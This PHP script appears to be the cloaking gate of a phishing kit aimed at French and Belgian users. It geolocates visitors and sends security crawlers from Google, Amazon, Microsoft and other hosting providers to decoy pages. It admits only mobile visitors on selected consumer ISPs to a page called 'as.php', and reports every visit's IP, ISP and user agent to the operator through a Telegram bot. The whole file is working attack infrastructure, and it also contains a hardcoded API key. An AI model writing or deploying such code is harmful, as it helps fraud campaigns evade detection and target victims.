
<?php
session_start();

$config = require 'config.php';

$bot_token     = $config['bot_token'];
$chat_id       = $config['chat_id'];
$testmode      = $config['test_mode'];
$belgium_mode  = $config['belgium_mode'];
$french_mode   = $config['french_mode'];
$mobile_only   = $config['mobile_only_mode'];

function getIpInfo($ip = '') {
    $ipinfo = file_get_contents("https://pro.ip-api.com/json/" . $ip . "?key=J9TQazL9UIH1so3");
    return json_decode($ipinfo, true);
}

function isMobile() {
    return preg_match('/android|iphone|macintosh|ipad|ipod|blackberry|windows phone|opera mini|iemobile/i', strtolower($_SERVER['HTTP_USER_AGENT']));
}

$visitor_ip = $testmode ? '77.136.67.217' : $_SERVER['REMOTE_ADDR'];
$ipinfo_json = getIpInfo($visitor_ip);

$org         = strtolower($ipinfo_json['as'] ?? 'N/A');
$isp         = strtolower($ipinfo_json['isp'] ?? '');
$agent       = $_SERVER['HTTP_USER_AGENT'];
$date        = date('Y-m-d H:i:s');
$countryCode = strtolower($ipinfo_json['countryCode'] ?? '');
$country     = $ipinfo_json['country'] ?? '';

if (!$belgium_mode && !$french_mode) {
    $error_message = <<<TEXT
<b>❌ ERREUR CONFIGURATION</b>
Aucun mode activé dans le fichier config.php
- IP: $visitor_ip
- FAI: $org
- ISP: $isp
- UA: $agent
TEXT;

    file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($error_message));
    die("Erreur de configuration : aucun mode actif (ni belge ni français).");
}

if ($mobile_only && !isMobile()) {
    $refus_message = <<<TEXT
<b>❌ REFUS - NON MOBILE</b>
├ 🌐 IP : $visitor_ip
├ 🖼️ FAI : $org
└ 💻 Type : $agent
TEXT;

    file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($refus_message));
    header("Location: https://www.lemonde.fr/");
    exit;
}

$blocked_orgs = [
    "google", "amazon", "mythic beasts ltd", "datacamp", "hetzner", "microsoft", "ovh", "akamai"
];

foreach ($blocked_orgs as $bad_org) {
    if (strpos($org, $bad_org) !== false) {
        $suspect_message = <<<TEXT
<b>⚠️ REDIRIGÉ - BOT OU VPN ?</b>
├ 🌐 IP : $visitor_ip
├ 🖼️ FAI : $org
└ 🧠 UA : $agent
TEXT;

        file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($suspect_message));
        header("Location: https://bit.ly/3EXEMPLE");
        exit;
    }
}

$french_orgs = [
    "bouygues", "orange", "sfr", "free", "wanadoo", "lycatel", "red by sfr",
    "b&you", "numerique", "etb", "la poste mobile", "cloudflare",
    "orange business", "sosh", "proxad", "free mobile"
];

$belgian_orgs = [
    "proximus", "telenet", "voo", "scarlet", "orange", "edpnet", "dommel", "telesat",
    "billi", "destiny", "combell", "fibernet", "schedom", "evonet", "clearmedia",
    "verixi", "perceval", "belcenter", "base", "lycamobil", "vikings", "vectone", "join experience"
];

$is_allowed = false;

if ($belgium_mode && $countryCode === 'be') {
    foreach ($belgian_orgs as $allowed) {
        if (strpos($isp, $allowed) !== false) {
            $is_allowed = true;
            break;
        }
    }
}

if ($french_mode && $countryCode === 'fr') {
    foreach ($french_orgs as $allowed) {
        if (strpos($org, $allowed) !== false) {
            $is_allowed = true;
            break;
        }
    }
}

if ($is_allowed) {
    $_SESSION['MASTER'] = true;
    $accept_message = <<<TEXT
<b>✅ +1 CLICK</b>
├ 🌐 IP : $visitor_ip
├ 🖼️ FAI : $org
├ 🌍 PAYS : $country
└ 📱 UA : $agent
TEXT;

    file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($accept_message));
    header("Location: as.php");
    exit;
} else {
    $refus_fai_message = <<<TEXT
<b>❌ REFUS - FAI/PAYS NON AUTORISÉ</b>
├ 🌐 IP : $visitor_ip
├ 🖼️ FAI : $org
├ 🌍 PAYS : $country
└ 📱 UA : $agent
TEXT;

    file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($refus_fai_message));
    header("Location: https://www.lemonde.fr/");
    exit;
}
?>
